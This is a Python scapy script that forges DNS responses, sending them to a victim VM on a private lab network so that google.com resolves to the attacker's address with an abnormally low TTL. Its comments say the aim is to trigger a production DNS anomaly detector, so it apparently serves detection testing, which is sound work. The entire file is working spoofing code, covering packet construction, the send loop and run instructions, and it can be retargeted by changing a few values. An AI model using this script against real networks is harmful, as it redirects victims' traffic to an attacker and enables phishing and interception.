#!/usr/bin/env python3
"""
Working DNS Spoofing Attack - TTL Anomaly Version
This version triggers the DNSAnomalyDetector which is already active in production.
The detector looks for abnormally LOW TTL values (< 10s) compared to baseline (3600s).
"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sendp
import random
import time

def run_dns_spoof_attack():
    """Execute DNS spoofing attack that triggers TTL anomaly detection."""
    
    # Network configuration
    interface = "eth0"              # Attacker interface (change to enp0s1 if needed)
    victim_ip = "192.168.128.6"     # Victim VM
    attacker_ip = "192.168.128.101" # Attacker VM
    fake_ip = attacker_ip           # Point google.com to attacker
    
    print("=" * 70)
    print("DNS SPOOFING ATTACK - ANOMALY-BASED DETECTION")
    print("=" * 70)
    print(f"\nTarget:     {victim_ip}")
    print(f"Attacker:   {attacker_ip}")
    print(f"Fake DNS:   google.com → {fake_ip}")
    print(f"Interface:  {interface}")
    print("\n🛡️  Monitor WILL detect this because:")
    print("   • TTL is 10 seconds (baseline expects 3600s)")
    print("   • TTL variance > 600s threshold")
    print("   • Matches DNSAnomalyDetector pattern")
    print("\n⏱️  Attack duration: 10 seconds")
    print("=" * 70)
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < 10:  # 10-second attack window
            # Create DNS response with LOW TTL (anomaly)
            dns_pkt = IP(src=attacker_ip, dst=victim_ip) / \
                      UDP(sport=53, dport=random.randint(10000, 60000)) / \
                      DNS(id=random.randint(0, 65535), 
                          qr=1,           # Response flag
                          rd=1, 
                          ra=1,
                          qd=DNSQR(qname="google.com"),
                          an=DNSRR(rrname="google.com", 
                                  ttl=10,  # ⚠️ CRITICAL: TTL too low (should be 3600+)
                                  rdata=fake_ip))
            
            sendp(dns_pkt, iface=interface, verbose=False)
            packet_count += 1
            
            # Print progress every 2 seconds
            elapsed = time.time() - start_time
            if packet_count % 20 == 0:
                print(f"  [{elapsed:.1f}s] Sent {packet_count} spoofed DNS responses...")
            
            # Small delay between packets
            time.sleep(0.05)
        
        elapsed = time.time() - start_time
        print(f"\n✅ Attack complete!")
        print(f"   • Sent {packet_count} packets in {elapsed:.1f}s")
        print(f"\n📊 Expected Monitor Logs:")
        print("   • PRODUCTION ALERT: dns_spoofing")
        print("   • Detection Method: ANOMALY_BASED")
        print("   • Confidence: 0.70-0.85")
        print("   • Detection window: 5-30 seconds")
        print("\n🔍 To verify on Monitor VM:")
        print("   tail -f production_security.log | grep -i dns")
        print("   tail -f security_events.jsonl | jq '.attack_type'")
        print("=" * 70)
        
    except Exception as e:
        print(f"\n❌ Attack failed: {e}")
        print("   Check: (1) Interface name correct? (2) Sudo privileges? (3) Scapy installed?")
        return False
    
    return True

if __name__ == "__main__":
    try:
        run_dns_spoof_attack()
    except KeyboardInterrupt:
        print("\n\n⚠️  Attack interrupted by user")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        sys.exit(1)
